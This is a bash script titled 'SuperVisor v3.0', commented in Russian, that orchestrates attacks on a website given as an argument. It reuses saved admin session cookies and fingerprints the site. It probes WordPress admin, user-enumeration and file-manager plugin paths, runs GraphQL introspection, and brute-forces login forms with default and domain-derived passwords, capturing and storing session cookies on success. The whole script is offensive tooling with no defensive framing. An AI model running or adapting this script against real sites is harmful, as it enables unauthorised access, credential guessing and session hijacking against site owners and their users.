#!/bin/bash
# SuperVisor v3.0 — умный диспетчер с памятью сессий
TARGET=$1
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

echo "[SUPERVISOR v3] Запускаю умную операцию..."

# Проверяем сохранённые сессии
SESSION=$(cat "$HOME/.shadow_sessions/${DOMAIN}_admin.session" 2>/dev/null | grep "^cookies=" | cut -d= -f2)
if [ -n "$SESSION" ]; then
    echo "[SUPERVISOR] Найдена сессия админа — использую для авторизованного скана"
    curl -sk --max-time 10 -b "$SESSION" "$TARGET/admin" -o /tmp/supervisor_auth.html 2>/dev/null
    echo "[SUPERVISOR] Авторизованный скан админки..."
fi

# Фаза 1: Разведка с авто-детектом
HTML=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null)

# Фаза 2: Выбор оружия на основе глубокого анализа
if echo "$HTML" | grep -qi "wp-content\|wordpress"; then
    echo "[SUPERVISOR] 🎯 WordPress → WP-скан + плагины"
    for p in /wp-admin /wp-login.php /wp-json/wp/v2/users /wp-content/plugins/wp-file-manager/; do
        code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$p" 2>/dev/null)
        [ "$code" = "200" ] && echo "  🔴 $p доступен!"
    done
elif echo "$HTML" | grep -qi "graphql\|__schema"; then
    echo "[SUPERVISOR] 🎯 GraphQL → полная интроспекция + мутации"
    curl -sk -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name,fields{name}}}}"}' "$TARGET/graphql" 2>/dev/null | head -50
elif echo "$HTML" | grep -qi "<form.*login\|<input.*password"; then
    echo "[SUPERVISOR] 🎯 Форма логина → умный брутфорс с учётом блокировок"
    for cred in "admin:admin" "${DOMAIN%%.*}:${DOMAIN%%.*}123"; do
        user="${cred%%:*}"; pass="${cred##*:}"
        code=$(curl -sk -d "username=$user&password=$pass" -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET/login" 2>/dev/null)
        if [ "$code" = "302" ]; then
            echo "  🔑 НАЙДЕН: $cred"
            COOKIES=$(curl -sk -d "username=$user&password=$pass" -c - --max-time 5 "$TARGET/login" 2>/dev/null | grep "Set-Cookie")
            [ -n "$COOKIES" ] && source ~/shadow.sh && guardian_save "$DOMAIN" "$COOKIES" "$user"
            break
        fi
    done
else
    echo "[SUPERVISOR] Неизвестный тип → глубокий скан с авто-адаптацией"
    ~/shadow.sh "$TARGET"
fi

echo "[SUPERVISOR v3] ✅ Операция завершена"
